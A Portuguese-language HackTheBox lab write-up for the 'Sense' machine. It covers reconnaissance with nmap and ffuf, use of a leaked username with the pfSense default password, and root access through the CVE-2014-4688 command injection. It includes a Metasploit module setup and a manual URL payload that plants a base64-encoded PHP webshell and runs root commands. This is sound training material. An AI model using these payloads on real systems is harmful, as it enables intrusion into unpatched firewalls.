Sense

HackTheBox · Easy by Brenno M.

Sense é um firewall pfSense 2.1.3. Um arquivo esquecido no servidor web entrega o usuário e a dica da senha (a padrão do pfSense), e com a sessão autenticada uma injeção de comando no status_rrd_graph_img.php (CVE-2014-4688) executa como root.

Reconhecimento

Só HTTP e HTTPS estão abertos. A porta 80 redireciona para a 443, onde fica o login do pfSense servido pelo lighttpd 1.4.35.

nmap -Pn -n -sT --min-rate 1500 -p- <IP>
nmap -Pn -n -sT -sV -sC -p80,443 <IP>
# 80 lighttpd 1.4.35 (redirect para https), 443 pfSense login

O fuzzing precisa incluir a extensão .txt e uma wordlist maior. Ele encontra o changelog.txt, que avisa que nem todas as correções foram aplicadas, e o system-users.txt.

ffuf -u https://<IP>/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .txt,.php
curl -k https://<IP>/system-users.txt
# username: Rohit
# password: company defaults

Acesso - credenciais padrão

"Company defaults" é a senha padrão do pfSense, pfsense. O usuário entra em minúsculas: rohit / pfsense. O painel mostra a versão 2.1.3-RELEASE.

Exploração - CVE-2014-4688

O parâmetro database do status_rrd_graph_img.php é concatenado num comando do shell. O pfSense roda a interface web como root, então a injeção já dá privilégio máximo. O módulo do Metasploit faz o login e a injeção.

msfconsole -q
use exploit/unix/http/pfsense_graph_injection_exec
set RHOSTS <IP>
set USERNAME rohit
set PASSWORD pfsense
set LHOST tun0
run

Manualmente, com a sessão do rohit aberta no navegador, a injeção grava um webshell PHP na raiz do site. O payload vai codificado em base64 para escapar do filtro de caracteres.

https://<IP>/status_rrd_graph_img.php?database=queues;cd+..;cd+..;cd+..;cd+usr;cd+local;cd+www;echo+"%3C%3Fphp+eval%28base64_decode%28%27ZWNobyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTs%27%29%29%3B%3F%3E">writeup.php
https://<IP>/writeup.php?cmd=id                       # uid=0(root)
https://<IP>/writeup.php?cmd=cat%20/home/rohit/user.txt
https://<IP>/writeup.php?cmd=cat%20/root/root.txt
